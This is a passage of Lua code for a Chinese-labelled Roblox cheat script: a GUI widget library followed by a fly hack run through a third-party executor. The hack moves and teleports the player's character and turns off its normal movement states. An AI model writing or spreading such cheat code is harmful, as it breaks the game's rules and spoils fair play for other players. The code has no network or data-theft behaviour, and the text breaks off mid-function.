            KeybindValue.Parent = KeybindBtn
            KeybindValue.BackgroundColor3 = Background
            KeybindValue.BorderSizePixel = 0
            KeybindValue.Position = UDim2.new(0.763033211, 0, 0.289473683, 0)
            KeybindValue.Size = UDim2.new(0, 100, 0, 28)
            KeybindValue.AutoButtonColor = false
            KeybindValue.Font = Enum.Font.Gotham
            KeybindValue.Text = keyTxt
            KeybindValue.TextColor3 = Color3.fromRGB(255, 255, 255)
            KeybindValue.TextSize = 14.000
            
            KeybindValueC.CornerRadius = UDim.new(0, 6)
            KeybindValueC.Name = "KeybindValueC"
            KeybindValueC.Parent = KeybindValue
            
            KeybindL.Name = "KeybindL"
            KeybindL.Parent = KeybindBtn
            KeybindL.HorizontalAlignment = Enum.HorizontalAlignment.Right
            KeybindL.SortOrder = Enum.SortOrder.LayoutOrder
            KeybindL.VerticalAlignment = Enum.VerticalAlignment.Center
            
            UIPadding.Parent = KeybindBtn
            UIPadding.PaddingRight = UDim.new(0, 6)   
            
            services.UserInputService.InputBegan:Connect(function(inp, gpe)
              if gpe then return end
              if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
              if inp.KeyCode ~= bindKey then return end
              callback(bindKey.Name)
            end)
            
            KeybindValue.MouseButton1Click:Connect(function()
              KeybindValue.Text = "..."
              wait()
              local key, uwu = services.UserInputService.InputEnded:Wait()
              local keyName = tostring(key.KeyCode.Name)
              if key.UserInputType ~= Enum.UserInputType.Keyboard then
                KeybindValue.Text = keyTxt
                return
              end
              if banned[keyName] then
                KeybindValue.Text = keyTxt
                return
              end
              wait()
              bindKey = Enum.KeyCode[keyName]
              KeybindValue.Text = shortNames[keyName] or keyName
            end)
    
            KeybindValue:GetPropertyChangedSignal("TextBounds"):Connect(function()
              KeybindValue.Size = UDim2.new(0, KeybindValue.TextBounds.X + 30, 0, 28)
            end)
            KeybindValue.Size = UDim2.new(0, KeybindValue.TextBounds.X + 30, 0, 28)
          end
    
          function section.Textbox(section, text, flag, default, callback)
            local callback = callback or function() end
            assert(text, "No text provided")
            assert(flag, "No flag provided")
            assert(default, "No default text provided")
    
            library.flags[flag] = default
    
            local TextboxModule = Instance.new("Frame")
            local TextboxBack = Instance.new("TextButton")
            local TextboxBackC = Instance.new("UICorner")
            local BoxBG = Instance.new("TextButton")
            local BoxBGC = Instance.new("UICorner")
            local TextBox = Instance.new("TextBox")
            local TextboxBackL = Instance.new("UIListLayout")
            local TextboxBackP = Instance.new("UIPadding")  
    
            TextboxModule.Name = "TextboxModule"
            TextboxModule.Parent = Objs
            TextboxModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextboxModule.BackgroundTransparency = 1.000
            TextboxModule.BorderSizePixel = 0
            TextboxModule.Position = UDim2.new(0, 0, 0, 0)
            TextboxModule.Size = UDim2.new(0, 428, 0, 38)
            
            TextboxBack.Name = "TextboxBack"
            TextboxBack.Parent = TextboxModule
            TextboxBack.BackgroundColor3 = zyColor
            TextboxBack.BorderSizePixel = 0
            TextboxBack.Size = UDim2.new(0, 428, 0, 38)
            TextboxBack.AutoButtonColor = false
            TextboxBack.Font = Enum.Font.GothamSemibold
            TextboxBack.Text = "   " .. text
            TextboxBack.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextboxBack.TextSize = 16.000
            TextboxBack.TextXAlignment = Enum.TextXAlignment.Left
            
            TextboxBackC.CornerRadius = UDim.new(0, 6)
            TextboxBackC.Name = "TextboxBackC"
            TextboxBackC.Parent = TextboxBack
            
            BoxBG.Name = "BoxBG"
            BoxBG.Parent = TextboxBack
            BoxBG.BackgroundColor3 = Background
            BoxBG.BorderSizePixel = 0
            BoxBG.Position = UDim2.new(0.763033211, 0, 0.289473683, 0)
            BoxBG.Size = UDim2.new(0, 100, 0, 28)
            BoxBG.AutoButtonColor = false
            BoxBG.Font = Enum.Font.Gotham
            BoxBG.Text = ""
            BoxBG.TextColor3 = Color3.fromRGB(255, 255, 255)
            BoxBG.TextSize = 14.000
            
            BoxBGC.CornerRadius = UDim.new(0, 6)
            BoxBGC.Name = "BoxBGC"
            BoxBGC.Parent = BoxBG
            
            TextBox.Parent = BoxBG
            TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.BackgroundTransparency = 1.000
            TextBox.BorderSizePixel = 0
            TextBox.Size = UDim2.new(1, 0, 1, 0)
            TextBox.Font = Enum.Font.Gotham
            TextBox.Text = default
            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.TextSize = 14.000
            
            TextboxBackL.Name = "TextboxBackL"
            TextboxBackL.Parent = TextboxBack
            TextboxBackL.HorizontalAlignment = Enum.HorizontalAlignment.Right
            TextboxBackL.SortOrder = Enum.SortOrder.LayoutOrder
            TextboxBackL.VerticalAlignment = Enum.VerticalAlignment.Center
            
            TextboxBackP.Name = "TextboxBackP"
            TextboxBackP.Parent = TextboxBack
            TextboxBackP.PaddingRight = UDim.new(0, 6)
    
            TextBox.FocusLost:Connect(function()
              if TextBox.Text == "" then
                TextBox.Text = default
              end
              library.flags[flag] = TextBox.Text
              callback(TextBox.Text)
            end)
    
            TextBox:GetPropertyChangedSignal("TextBounds"):Connect(function()
              BoxBG.Size = UDim2.new(0, TextBox.TextBounds.X + 30, 0, 28)
            end)
            BoxBG.Size = UDim2.new(0, TextBox.TextBounds.X + 30, 0, 28)
          end
    
          function section.Slider(section, text, flag, default, min, max, precise, callback)
            local callback = callback or function() end
            local min = min or 1
            local max = max or 10
            local default = default or min
            local precise = precise or false
    
            library.flags[flag] = default
    
            assert(text, "No text provided")
            assert(flag, "No flag provided")
            assert(default, "No default value provided")
            
            local SliderModule = Instance.new("Frame")
            local SliderBack = Instance.new("TextButton")
            local SliderBackC = Instance.new("UICorner")
            local SliderBar = Instance.new("Frame")
            local SliderBarC = Instance.new("UICorner")
            local SliderPart = Instance.new("Frame")
            local SliderPartC = Instance.new("UICorner")
            local SliderValBG = Instance.new("TextButton")
            local SliderValBGC = Instance.new("UICorner")
            local SliderValue = Instance.new("TextBox")
            local MinSlider = Instance.new("TextButton")
            local AddSlider = Instance.new("TextButton")   
            
            SliderModule.Name = "SliderModule"
            SliderModule.Parent = Objs
            SliderModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderModule.BackgroundTransparency = 1.000
            SliderModule.BorderSizePixel = 0
            SliderModule.Position = UDim2.new(0, 0, 0, 0)
            SliderModule.Size = UDim2.new(0, 428, 0, 38)
            
            SliderBack.Name = "SliderBack"
            SliderBack.Parent = SliderModule
            SliderBack.BackgroundColor3 = zyColor
            SliderBack.BorderSizePixel = 0
            SliderBack.Size = UDim2.new(0, 428, 0, 38)
            SliderBack.AutoButtonColor = false
            SliderBack.Font = Enum.Font.GothamSemibold
            SliderBack.Text = "   " .. text
            SliderBack.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderBack.TextSize = 16.000
            SliderBack.TextXAlignment = Enum.TextXAlignment.Left
            
            SliderBackC.CornerRadius = UDim.new(0, 6)
            SliderBackC.Name = "SliderBackC"
            SliderBackC.Parent = SliderBack
            
            SliderBar.Name = "SliderBar"
            SliderBar.Parent = SliderBack
            SliderBar.AnchorPoint = Vector2.new(0, 0.5)
            SliderBar.BackgroundColor3 = Background
            SliderBar.BorderSizePixel = 0
            SliderBar.Position = UDim2.new(0.369000018, 40, 0.5, 0)
            SliderBar.Size = UDim2.new(0, 140, 0, 12)
            
            SliderBarC.CornerRadius = UDim.new(0, 4)
            SliderBarC.Name = "SliderBarC"
            SliderBarC.Parent = SliderBar
            
            SliderPart.Name = "SliderPart"
            SliderPart.Parent = SliderBar
            SliderPart.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderPart.BorderSizePixel = 0
            SliderPart.Size = UDim2.new(0, 54, 0, 13)
            
            SliderPartC.CornerRadius = UDim.new(0, 4)
            SliderPartC.Name = "SliderPartC"
            SliderPartC.Parent = SliderPart
            
            SliderValBG.Name = "SliderValBG"
            SliderValBG.Parent = SliderBack
            SliderValBG.BackgroundColor3 = Background
            SliderValBG.BorderSizePixel = 0
            SliderValBG.Position = UDim2.new(0.883177578, 0, 0.131578952, 0)
            SliderValBG.Size = UDim2.new(0, 44, 0, 28)
            SliderValBG.AutoButtonColor = false
            SliderValBG.Font = Enum.Font.Gotham
            SliderValBG.Text = ""
            SliderValBG.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderValBG.TextSize = 14.000
            
            SliderValBGC.CornerRadius = UDim.new(0, 6)
            SliderValBGC.Name = "SliderValBGC"
            SliderValBGC.Parent = SliderValBG
            
            SliderValue.Name = "SliderValue"
            SliderValue.Parent = SliderValBG
            SliderValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.BackgroundTransparency = 1.000
            SliderValue.BorderSizePixel = 0
            SliderValue.Size = UDim2.new(1, 0, 1, 0)
            SliderValue.Font = Enum.Font.Gotham
            SliderValue.Text = "1000"
            SliderValue.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.TextSize = 14.000
            
            MinSlider.Name = "MinSlider"
            MinSlider.Parent = SliderModule
            MinSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            MinSlider.BackgroundTransparency = 1.000
            MinSlider.BorderSizePixel = 0
            MinSlider.Position = UDim2.new(0.296728969, 40, 0.236842096, 0)
            MinSlider.Size = UDim2.new(0, 20, 0, 20)
            MinSlider.Font = Enum.Font.Gotham
            MinSlider.Text = "-"
            MinSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
            MinSlider.TextSize = 24.000
            MinSlider.TextWrapped = true
            
            AddSlider.Name = "AddSlider"
            AddSlider.Parent = SliderModule
            AddSlider.AnchorPoint = Vector2.new(0, 0.5)
            AddSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            AddSlider.BackgroundTransparency = 1.000
            AddSlider.BorderSizePixel = 0
            AddSlider.Position = UDim2.new(0.810906529, 0, 0.5, 0)
            AddSlider.Size = UDim2.new(0, 20, 0, 20)
            AddSlider.Font = Enum.Font.Gotham
            AddSlider.Text = "+"
            AddSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
            AddSlider.TextSize = 24.000
            AddSlider.TextWrapped = true
            
            local funcs = {
              SetValue = function(self, value)
                local percent = (mouse.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X
                if value then
                  percent = (value - min) / (max - min)
                end
                percent = math.clamp(percent, 0, 1)
                if precise then
                  value = value or tonumber(string.format("%.1f", tostring(min + (max - min) * percent)))
                else
                  value = value or math.floor(min + (max - min) * percent)
                end
                library.flags[flag] = tonumber(value)
                SliderValue.Text = tostring(value)
                SliderPart.Size = UDim2.new(percent, 0, 1, 0)
                callback(tonumber(value))
              end
            }
    
            MinSlider.MouseButton1Click:Connect(function()
              local currentValue = library.flags[flag]
              currentValue = math.clamp(currentValue - 1, min, max)
              funcs:SetValue(currentValue)
            end)
    
            AddSlider.MouseButton1Click:Connect(function()
              local currentValue = library.flags[flag]
              currentValue = math.clamp(currentValue + 1, min, max)
              funcs:SetValue(currentValue)
            end)
            
            funcs:SetValue(default)
    
            local dragging, boxFocused, allowed = false, false, {
              [""] = true,
              ["-"] = true
            }
    
            SliderBar.InputBegan:Connect(function(input)
              if input.UserInputType == Enum.UserInputType.MouseButton1 then
                funcs:SetValue()
                dragging = true
              end
            end)
    
            services.UserInputService.InputEnded:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
              end
            end)
    
            services.UserInputService.InputChanged:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                funcs:SetValue()
              end
            end)

            SliderBar.InputBegan:Connect(function(input)
              if input.UserInputType == Enum.UserInputType.Touch then
                funcs:SetValue()
                dragging = true
              end
            end)
    
            services.UserInputService.InputEnded:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
              end
            end)
    
            services.UserInputService.InputChanged:Connect(function(input)
              if dragging and input.UserInputType == Enum.UserInputType.Touch then
                funcs:SetValue()
              end
            end)
    
            SliderValue.Focused:Connect(function()
              boxFocused = true
            end)
    
            SliderValue.FocusLost:Connect(function()
              boxFocused = false
              if SliderValue.Text == "" then
                funcs:SetValue(default)
              end
            end)
    
            SliderValue:GetPropertyChangedSignal("Text"):Connect(function()
              if not boxFocused then return end
              SliderValue.Text = SliderValue.Text:gsub("%D+", "")
              
              local text = SliderValue.Text
              
              if not tonumber(text) then
                SliderValue.Text = SliderValue.Text:gsub('%D+', '')
              elseif not allowed[text] then
                if tonumber(text) > max then
                  text = max
                  SliderValue.Text = tostring(max)
                end
                funcs:SetValue(tonumber(text))
              end
            end)
    
            return funcs
          end
          function section.Dropdown(section, text, flag, options, callback)
            local callback = callback or function() end
            local options = options or {}
            assert(text, "No text provided")
            assert(flag, "No flag provided")
    
            library.flags[flag] = nil
            
            local DropdownModule = Instance.new("Frame")
            local DropdownTop = Instance.new("TextButton")
            local DropdownTopC = Instance.new("UICorner")
            local DropdownOpen = Instance.new("TextButton")
            local DropdownText = Instance.new("TextBox")
            local DropdownModuleL = Instance.new("UIListLayout")
            local Option = Instance.new("TextButton")
            local OptionC = Instance.new("UICorner")        
    
            DropdownModule.Name = "DropdownModule"
            DropdownModule.Parent = Objs
            DropdownModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownModule.BackgroundTransparency = 1.000
            DropdownModule.BorderSizePixel = 0
            DropdownModule.ClipsDescendants = true
            DropdownModule.Position = UDim2.new(0, 0, 0, 0)
            DropdownModule.Size = UDim2.new(0, 428, 0, 38)
            
            DropdownTop.Name = "DropdownTop"
            DropdownTop.Parent = DropdownModule
            DropdownTop.BackgroundColor3 = zyColor
            DropdownTop.BorderSizePixel = 0
            DropdownTop.Size = UDim2.new(0, 428, 0, 38)
            DropdownTop.AutoButtonColor = false
            DropdownTop.Font = Enum.Font.GothamSemibold
            DropdownTop.Text = ""
            DropdownTop.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownTop.TextSize = 16.000
            DropdownTop.TextXAlignment = Enum.TextXAlignment.Left
            
            DropdownTopC.CornerRadius = UDim.new(0, 6)
            DropdownTopC.Name = "DropdownTopC"
            DropdownTopC.Parent = DropdownTop
            
            DropdownOpen.Name = "DropdownOpen"
            DropdownOpen.Parent = DropdownTop
            DropdownOpen.AnchorPoint = Vector2.new(0, 0.5)
            DropdownOpen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownOpen.BackgroundTransparency = 1.000
            DropdownOpen.BorderSizePixel = 0
            DropdownOpen.Position = UDim2.new(0.918383181, 0, 0.5, 0)
            DropdownOpen.Size = UDim2.new(0, 20, 0, 20)
            DropdownOpen.Font = Enum.Font.Gotham
            DropdownOpen.Text = "+"
            DropdownOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownOpen.TextSize = 24.000
            DropdownOpen.TextWrapped = true
            
            DropdownText.Name = "DropdownText"
            DropdownText.Parent = DropdownTop
            DropdownText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownText.BackgroundTransparency = 1.000
            DropdownText.BorderSizePixel = 0
            DropdownText.Position = UDim2.new(0.0373831764, 0, 0, 0)
            DropdownText.Size = UDim2.new(0, 184, 0, 38)
            DropdownText.Font = Enum.Font.GothamSemibold
            DropdownText.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
            DropdownText.PlaceholderText = text
            DropdownText.Text = ""
            DropdownText.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownText.TextSize = 16.000
            DropdownText.TextXAlignment = Enum.TextXAlignment.Left
            
            DropdownModuleL.Name = "DropdownModuleL"
            DropdownModuleL.Parent = DropdownModule
            DropdownModuleL.SortOrder = Enum.SortOrder.LayoutOrder
            DropdownModuleL.Padding = UDim.new(0, 4)
    
            local setAllVisible = function()
              local options = DropdownModule:GetChildren() 
              for i=1, #options do
                local option = options[i]
                if option:IsA("TextButton") and option.Name:match("Option_") then
                  option.Visible = true
                end
              end
            end
    
            local searchDropdown = function(text)
              local options = DropdownModule:GetChildren()
              for i=1, #options do
                local option = options[i]
                if text == "" then
                  setAllVisible()
                else
                  if option:IsA("TextButton") and option.Name:match("Option_") then
                    if option.Text:lower():match(text:lower()) then
                      option.Visible = true
                    else
                      option.Visible = false
                    end
                  end
                end
              end
            end
    
            local open = false
            local ToggleDropVis = function()
              open = not open
              if open then setAllVisible() end
              DropdownOpen.Text = (open and "-" or "+")
              DropdownModule.Size = UDim2.new(0, 428, 0, (open and DropdownModuleL.AbsoluteContentSize.Y + 4 or 38))
            end
    
            DropdownOpen.MouseButton1Click:Connect(ToggleDropVis)
            DropdownText.Focused:Connect(function()
              if open then return end
              ToggleDropVis()
            end)
    
            DropdownText:GetPropertyChangedSignal("Text"):Connect(function()
              if not open then return end
              searchDropdown(DropdownText.Text)
            end)
    
            DropdownModuleL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
              if not open then return end
              DropdownModule.Size = UDim2.new(0, 428, 0, (DropdownModuleL.AbsoluteContentSize.Y + 4))
            end)
            
            local funcs = {}
            funcs.AddOption = function(self, option)
              local Option = Instance.new("TextButton")
              local OptionC = Instance.new("UICorner")     
    
              Option.Name = "Option_" .. option
              Option.Parent = DropdownModule
              Option.BackgroundColor3 = zyColor
              Option.BorderSizePixel = 0
              Option.Position = UDim2.new(0, 0, 0.328125, 0)
              Option.Size = UDim2.new(0, 428, 0, 26)
              Option.AutoButtonColor = false
              Option.Font = Enum.Font.Gotham
              Option.Text = option
              Option.TextColor3 = Color3.fromRGB(255, 255, 255)
              Option.TextSize = 14.000
              
              OptionC.CornerRadius = UDim.new(0, 6)
              OptionC.Name = "OptionC"
              OptionC.Parent = Option
    
              Option.MouseButton1Click:Connect(function()
                ToggleDropVis()
                callback(Option.Text)
                DropdownText.Text = Option.Text
                library.flags[flag] = Option.Text
              end)
            end
    
            funcs.RemoveOption = function(self, option)
              local option = DropdownModule:FindFirstChild("Option_" .. option)
              if option then option:Destroy() end
            end
    
            funcs.SetOptions = function(self, options)
              for _, v in next, DropdownModule:GetChildren() do
                if v.Name:match("Option_") then
                  v:Destroy()
                end
              end
              for _,v in next, options do
                funcs:AddOption(v)
              end
            end
    
            funcs:SetOptions(options)
    
            return funcs
          end
          return section
        end
        return tab
      end
      return window
    end
    
    
local window = library:new("繁星脚本")

local creds = window:Tab("信息",'6035145364')

local bin = creds:section("信息",true)

    bin:Label("你的用户名："..game.Players.LocalPlayer.Character.Humanoid.Name)
    bin:Label("你的注入器:"..identifyexecutor())

local credits = creds:section("UI设置",true)

    credits:Button("摧毁UI",function()
        game:GetService("CoreGui")["frosty"]:Destroy()
    end)

    credits:Toggle("彩虹UI", "", false, function(state)
        if state then
        game:GetService("CoreGui")["frosty"].Main.Style = "DropShadow"
        else
            game:GetService("CoreGui")["frosty"].Main.Style = "Custom"
        end
    end)
    
local creds = window:Tab("通用",'6035145364')

local tool = creds:section("通用",true)

tool:Button("飞行",function()
        game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Credits";
                Text ="zhanghuihuihui";
                Duration = 2.5;
            })
-- Gui to Lua
-- Version: 3.2

-- Instances:

local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local up = Instance.new("TextButton")
local down = Instance.new("TextButton")
local onof = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local plus = Instance.new("TextButton")
local speed = Instance.new("TextLabel")
local mine = Instance.new("TextButton")

--Properties:

main.Name = "main"
main.Parent = game.CoreGui
main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = main
Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "向上"
up.Parent = Frame
up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
up.Size = UDim2.new(0, 44, 0, 28)
up.Font = Enum.Font.SourceSans
up.Text = "向上"
up.TextColor3 = Color3.fromRGB(0, 0, 0)
up.TextSize = 14.000

down.Name = "向下"
down.Parent = Frame
down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
down.Position = UDim2.new(0, 0, 0.491228074, 0)
down.Size = UDim2.new(0, 44, 0, 28)
down.Font = Enum.Font.SourceSans
down.Text = "向下"
down.TextColor3 = Color3.fromRGB(0, 0, 0)
down.TextSize = 14.000

onof.Name = "onof"
onof.Parent = Frame
onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
onof.Size = UDim2.new(0, 56, 0, 28)
onof.Font = Enum.Font.SourceSans
onof.Text = "乐迪起飞了！"
onof.TextColor3 = Color3.fromRGB(0, 0, 0)
onof.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "繁星🚔"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

plus.Name = "plus"
plus.Parent = Frame
plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
plus.Position = UDim2.new(0.231578946, 0, 0, 0)
plus.Size = UDim2.new(0, 45, 0, 28)
plus.Font = Enum.Font.SourceSans
plus.Text = "乐迪加速"
plus.TextColor3 = Color3.fromRGB(0, 0, 0)
plus.TextScaled = true
plus.TextSize = 14.000
plus.TextWrapped = true

speed.Name = "speed"
speed.Parent = Frame
speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
speed.Size = UDim2.new(0, 44, 0, 28)
speed.Font = Enum.Font.SourceSans
speed.Text = "1"
speed.TextColor3 = Color3.fromRGB(0, 0, 0)
speed.TextScaled = true
speed.TextSize = 14.000
speed.TextWrapped = true

mine.Name = "mine"
mine.Parent = Frame
mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
mine.Size = UDim2.new(0, 45, 0, 29)
mine.Font = Enum.Font.SourceSans
mine.Text = "乐迪坠机"
mine.TextColor3 = Color3.fromRGB(0, 0, 0)
mine.TextScaled = true
mine.TextSize = 14.000
mine.TextWrapped = true

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

Frame.Active = true -- main = gui
Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.LowerTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false



	





end)


up.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,2,0)
	
end)


down.MouseButton1Down:connect(function()

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-2,0)

end)


game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
	wait(0.7)
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)


plus.MouseButton1Down:connect(function()
	speeds = speeds + 1
	speed.Text = speeds
	if nowe == true then
		

	tpwalking = false
	for i = 1, speeds do
		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	


